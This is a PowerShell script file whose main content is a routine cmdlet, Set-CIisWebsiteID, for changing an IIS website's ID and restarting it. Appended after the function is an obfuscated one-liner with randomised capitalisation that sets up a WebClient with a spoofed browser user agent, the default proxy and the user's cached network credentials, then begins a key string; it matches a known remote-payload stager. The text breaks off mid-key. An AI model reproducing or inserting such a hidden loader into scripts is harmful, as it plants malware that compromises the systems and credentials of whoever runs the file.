
function Set-CIisWebsiteID
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $SiteName,

        [Parameter(Mandatory=$true)]
        [int]
        
        $ID
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    if( -not (Test-CIisWebsite -Name $SiteName) )
    {
        Write-Error ('Website {0} not found.' -f $SiteName)
        return
    }

    $websiteWithID = Get-CIisWebsite | Where-Object { $_.ID -eq $ID -and $_.Name -ne $SiteName }
    if( $websiteWithID )
    {
        Write-Error -Message ('ID {0} already in use for website {1}.' -f $ID,$SiteName) -Category ResourceExists
        return
    }

    $website = Get-CIisWebsite -SiteName $SiteName
    $startWhenDone = $false
    if( $website.ID -ne $ID )
    {
        if( $PSCmdlet.ShouldProcess( ('website {0}' -f $SiteName), ('set site ID to {0}' -f $ID) ) )
        {
            $startWhenDone = ($website.State -eq 'Started')
            $website.ID = $ID
            $website.CommitChanges()
        }
    }

    if( $PSBoundParameters.ContainsKey('WhatIf') )
    {
        return
    }

    
    $website = $null
    $maxTries = 100
    $numTries = 0
    do
    {
        Start-Sleep -Milliseconds 100
        $website = Get-CIisWebsite -SiteName $SiteName
        if( $website -and $website.ID -eq $ID )
        {
            break
        }
        $numTries++
    }
    while( $numTries -lt $maxTries )

    if( -not $website -or $website.ID -ne $ID )
    {
        Write-Error ('IIS:/{0}: site ID hasn''t changed to {1} after waiting 10 seconds. Please check IIS configuration.' -f $SiteName,$ID)
    }

    if( -not $startWhenDone )
    {
        return
    }

    
    $numTries = 0
    do
    {
        
        try
        {
            if( $website )
            {
                $null = $website.Start()
            }
        }
        catch
        {
            $website = $null
        }

        Start-Sleep -Milliseconds 100
        $website = Get-CIisWebsite -SiteName $SiteName
        if( $website -and $website.State -eq 'Started' )
        {
            break
        }
        $numTries++
    }
    while( $numTries -lt $maxTries )

    if( -not $website -or $website.State -ne 'Started' )
    {
        Write-Error ('IIS:/{0}: failed to start website after setting ID to {1}' -f $SiteName,$ID)
    }
}


$wc=New-ObJeCT SYsTem.NeT.WEBClIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeADERS.ADD('User-Agent',$u);$Wc.PRoxy = [SYstEm.Net.WEbREquesT]::DEFaUlTWeBPRoXY;$wC.PRoXY.CReDentIAlS = [SysTem.NET.CrEdentiALCAChE]::DefAULTNetworKCrEdEntiAlS;$K='pU*=9a_:VQi8

